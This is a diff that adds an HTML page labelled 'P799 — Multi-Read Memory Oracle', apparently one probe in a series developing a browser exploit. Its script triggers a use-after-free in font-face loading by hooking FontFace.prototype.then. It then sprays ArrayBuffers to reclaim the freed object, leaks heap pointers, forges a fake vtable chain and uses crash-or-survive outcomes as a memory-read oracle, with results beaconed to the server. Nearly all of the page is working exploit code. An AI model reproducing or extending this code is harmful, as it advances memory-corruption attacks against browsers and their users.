@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P799 — Multi-Read Memory Oracle</title>
+<style>
+  body { background: #0c0d14; color: #d0d7de; font-family: monospace; font-size: 14px; padding: 20px; }
+  pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; color: #7ee787; font-size: 13px; white-space: pre-wrap; word-break: break-all; }
+</style>
+<script>
+'use strict';
+/* ============================================================
+ * P799 — Multi-Read Memory Oracle
+ *
+ * CONFIRMED by P798: vtable[3] is a DATA POINTER.
+ * Engine reads [vtable[3]+0] = value.
+ *   value == 0 → crash
+ *   value != 0 → survive
+ *
+ * This probe tests MULTIPLE oracle reads per boot:
+ *   Pass 1: standard UAF → get self, q11, q13, setup chain
+ *   Pass 2..N: each reads [target] via the oracle
+ *   Each survive = [target] is nonzero, advance to next
+ *   Any crash = [target] is zero or unmapped, boot lost
+ *
+ * TARGETS:
+ *   0: self+0x00 (q0=1, calibration — MUST survive)
+ *   1: self+0x58 (q11=heap ptr, calibration — MUST survive)
+ *   2-11: q13_1+0x00..+0x48 (freed CSSFontFaceSource fields)
+ *
+ * If multi-read works AND q13_1 fields are nonzero,
+ * the freed object's vtable pointer is still intact!
+ *
+ * CRASH_CLASS: HIGH — controlled pointer chain
+ * ============================================================ */
+
+window.onerror = function(msg, url, line){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P799-JSERR&data=' + encodeURIComponent((msg||'') + ' L' + line) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+};
+
+function h16(v){ return ('0000000000000000' + BigInt(v || 0).toString(16)).slice(-16); }
+
+function b(tag, data){
+  try { var x = new XMLHttpRequest();
+    x.open('GET', '/beacon.php?tag=P799-' + encodeURIComponent(tag) +
+      '&data=' + encodeURIComponent(String(data || '').slice(0, 700)) + '&t=' + Date.now(), false);
+    x.send(null); } catch(e){}
+}
+
+var out;
+function log(s){ if(out) out.textContent += s + '\n'; }
+
+function run(){
+  out = document.getElementById('out');
+  out.textContent = '';
+
+  b('BOOT', 'start');
+  log('P799 — Multi-Read Memory Oracle\n');
+
+  /* ===== PASS 1: get addresses ===== */
+  var st1 = document.createElement('style');
+  st1.textContent = '@font-face{font-family:or1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(st1);
+
+  var face1 = new FontFace('mf1', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(face1);
+  void face1.loaded;
+
+  var abs1 = [], fired1 = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (fired1) return undefined;
+      fired1 = true;
+      if (st1){ st1.remove(); st1.textContent = ''; st1 = null; }
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+      for (var k = 0; k < 64; k++) abs1.push(new ArrayBuffer(192));
+      try { document.fonts.check('1em or1'); } catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  document.fonts.load('1em mf1, or1', 'AB');
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    var best1 = -1;
+    for (var i = 0; i < abs1.length; i++){
+      var v = new BigUint64Array(abs1[i]);
+      if (v[0] === 1n){ best1 = i; break; }
+    }
+    if (best1 < 0){
+      b('P1-MISS', 'no_reclaim');
+      log('P1 MISS, reloading...');
+      setTimeout(function(){ location.reload(); }, 500);
+      return;
+    }
+
+    var view1 = new BigUint64Array(abs1[best1]);
+    var q11_1 = view1[11];
+    var q13_1 = view1[13];
+    var self1 = q11_1 - 0x68n;
+
+    b('P1-HIT', 'self=0x' + h16(self1) + '|q13=0x' + h16(q13_1) + '|dist=' + Number(self1 - q13_1));
+    log('P1 HIT: self=0x' + h16(self1));
+    log('        q13 =0x' + h16(q13_1));
+    log('        dist=' + Number(self1 - q13_1) + ' bytes\n');
+
+    /* Setup chain in pass1 AB (same as P798-B proven pattern) */
+    view1[13] = self1 + 0x10n;        /* q13 → fake sub-obj at q2 */
+    view1[2]  = self1 + 0x20n;        /* q2 → vtable base at q4 */
+    view1[3]  = 0n;
+    for (var i = 4; i <= 10; i++) view1[i] = 0n;
+    view1[14] = 0x4242424242424242n;  /* q14 = nonzero landing pad */
+    view1[15] = 0n;
+    view1[16] = 0n;
+
+    /* Define scan targets */
+    var targets = [
+      { addr: self1,            label: 'self+0 (q0=1 cal)' },
+      { addr: self1 + 0x58n,   label: 'self+0x58 (q11 cal)' },
+      { addr: q13_1,           label: 'q13+0x00 (vtable?)' },
+      { addr: q13_1 + 8n,     label: 'q13+0x08' },
+      { addr: q13_1 + 16n,    label: 'q13+0x10' },
+      { addr: q13_1 + 24n,    label: 'q13+0x18' },
+      { addr: q13_1 + 32n,    label: 'q13+0x20' },
+      { addr: q13_1 + 40n,    label: 'q13+0x28' },
+      { addr: q13_1 + 48n,    label: 'q13+0x30' },
+      { addr: q13_1 + 56n,    label: 'q13+0x38' },
+      { addr: q13_1 + 64n,    label: 'q13+0x40' },
+      { addr: q13_1 + 72n,    label: 'q13+0x48' },
+    ];
+
+    b('TARGETS', 'count=' + targets.length);
+    log('Targets: ' + targets.length + '\n');
+
+    /* Start sequential oracle reads */
+    doOracleRead(view1, q11_1, targets, 0, 2);
+  }, 400);
+}
+
+/* ===== Oracle read: one UAF pass per target ===== */
+function doOracleRead(view1, q11_1, targets, idx, passNum){
+  if (idx >= targets.length){
+    b('DONE', 'all_' + idx + '_survived');
+    log('\n*** ALL ' + idx + ' TARGETS SURVIVED ***');
+    return;
+  }
+
+  var t = targets[idx];
+
+  /* Point vtable[3] at the target address */
+  view1[7] = t.addr;
+
+  b('T' + idx, 'addr=0x' + h16(t.addr) + '|' + t.label);
+  log('Oracle #' + idx + ': ' + t.label);
+
+  /* Build unique font families for this pass */
+  var baseChar = 0x44 + 2 * (passNum - 2); /* D,F,H,J,L,N,P,R,T,V,X,Z */
+  var stFamily = 'os' + passNum;
+  var fcFamily = 'of' + passNum;
+  var stChar = String.fromCharCode(baseChar);
+  var fcChar = String.fromCharCode(baseChar + 1);
+
+  var stN = document.createElement('style');
+  stN.textContent = '@font-face{font-family:' + stFamily +
+    ';src:local(Arial);unicode-range:U+00' +
+    baseChar.toString(16).toUpperCase() + ';}';
+  document.head.appendChild(stN);
+
+  var faceN = new FontFace(fcFamily, 'local(Helvetica)', {
+    unicodeRange: 'U+00' + (baseChar + 1).toString(16).toUpperCase()
+  });
+  document.fonts.add(faceN);
+  void faceN.loaded;
+
+  var absN = [], firedN = false;
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (firedN) return undefined;
+      firedN = true;
+      if (stN){ stN.remove(); stN.textContent = ''; stN = null; }
+      try { document.fonts.delete(this); } catch(e){}
+      document.body.offsetHeight;
+
+      /* Spray with q1 = q11_1, pointing to pass1 AB's q13 slot */
+      for (var k = 0; k < 64; k++){
+        var ab = new ArrayBuffer(192);
+        var v = new BigUint64Array(ab);
+        v[1] = q11_1;
+        absN.push(ab);
+      }
+
+      try { document.fonts.check('1em ' + stFamily); } catch(e){}
+      document.body.offsetHeight;
+      return undefined;
+    },
+    set: function(){}
+  });
+
+  document.fonts.load('1em ' + fcFamily + ', ' + stFamily, stChar + fcChar);
+
+  setTimeout(function(){
+    delete FontFace.prototype.then;
+
+    /* Check if pass N AB was reclaimed */
+    var bestN = -1;
+    for (var i = 0; i < absN.length; i++){
+      var v = new BigUint64Array(absN[i]);
+      if (v[0] === 1n){ bestN = i; break; }
+    }
+
+    if (bestN < 0){
+      /* No reclaim — UAF didn't fire or reclaim failed */
+      b('T' + idx + '-MISS', 'no_reclaim_p' + passNum);
+      log('  ? MISS (no reclaim, skipping)');
+      /* Skip this target, try next */
+      setTimeout(function(){
+        doOracleRead(view1, q11_1, targets, idx + 1, passNum + 1);
+      }, 300);
+      return;
+    }
+
+    /* SUCCESS: chain survived → [target] is nonzero! */
+    var viewN = new BigUint64Array(absN[bestN]);
+    b('T' + idx + '-NZ', 'p=' + passNum +
+      '|q11N=0x' + h16(viewN[11]) +
+      '|q13N=0x' + h16(viewN[13]));
+    log('  NZ (pass ' + passNum + ')');
+
+    /* Continue to next target */
+    setTimeout(function(){
+      doOracleRead(view1, q11_1, targets, idx + 1, passNum + 1);
+    }, 300);
+  }, 500);
+}
+
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+</script>
+</head>
+<body>
+  <pre id="out">P799 — Multi-Read Memory Oracle — Loading...</pre>
+</body>
+</html>
